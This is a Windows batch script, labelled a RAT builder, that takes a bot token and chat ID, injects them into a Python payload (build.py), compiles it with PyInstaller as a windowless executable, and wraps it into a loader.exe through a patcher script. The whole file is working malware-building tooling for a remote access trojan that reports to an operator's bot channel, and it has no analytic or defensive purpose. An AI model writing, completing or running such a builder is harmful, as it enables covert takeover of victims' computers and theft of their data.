@echo off
setlocal enabledelayedexpansion
title RAT Builder CLI

echo.
echo  ==========================================
echo            RAT BUILDER - CLI
echo  ==========================================
echo.

if not exist "build.py" (
    echo [!] build.py not found in current folder.
    pause
    exit /b 1
)
if not exist "patcher.py" (
    echo [!] patcher.py not found in current folder.
    pause
    exit /b 1
)

set "BOT_TOKEN="
set "CHAT_ID="

set /p BOT_TOKEN=Bot token: 
set /p CHAT_ID=Chat ID: 

if "%BOT_TOKEN%"=="" (
    echo [!] token empty.
    pause
    exit /b 1
)
if "%CHAT_ID%"=="" (
    echo [!] chat_id empty.
    pause
    exit /b 1
)

echo.
echo [*] Preparing workspace...
if exist work rmdir /s /q work
mkdir work
copy /y build.py work\build.py >nul
copy /y patcher.py work\patcher.py >nul

echo [*] Injecting token and chat_id...
python -c "import re,sys; p='work/build.py'; s=open(p,encoding='utf-8').read(); s=re.sub(r'BOT_TOKEN\s*=\s*\"[^\"]*\"','BOT_TOKEN = \"'+sys.argv[1]+'\"',s); s=re.sub(r'OPERATOR_ID\s*=\s*\"[^\"]*\"','OPERATOR_ID = \"'+sys.argv[2]+'\"',s); open(p,'w',encoding='utf-8').write(s)" "%BOT_TOKEN%" "%CHAT_ID%"

if errorlevel 1 (
    echo [!] inject failed.
    pause
    exit /b 1
)
echo [*] Injected.

echo.
echo [*] Building payload with PyInstaller...
cd work
python -m PyInstaller --onefile --noconsole --clean --noconfirm --name build build.py
if errorlevel 1 (
    echo [!] PyInstaller failed.
    cd ..
    pause
    exit /b 1
)
if not exist "dist\build.exe" (
    echo [!] dist\build.exe not produced.
    cd ..
    pause
    exit /b 1
)
echo [+] build.exe ready.

echo.
echo [*] Patching into loader...
python patcher.py dist\build.exe
if errorlevel 1 (
    echo [!] patcher failed.
    cd ..
    pause
    exit /b 1
)
if not exist "dist\loader.exe" (
    echo [!] loader.exe not produced.
    cd ..
    pause
    exit /b 1
)

echo.
echo [*] Copying artifact...
if not exist "%USERPROFILE%\rat_builder_output" mkdir "%USERPROFILE%\rat_builder_output"
copy /y "dist\loader.exe" "%USERPROFILE%\rat_builder_output\loader.exe" >nul

cd ..
echo.
echo  ==========================================
echo   [+] DONE: %USERPROFILE%\rat_builder_output\loader.exe
echo  ==========================================
echo.
pause
endlocal
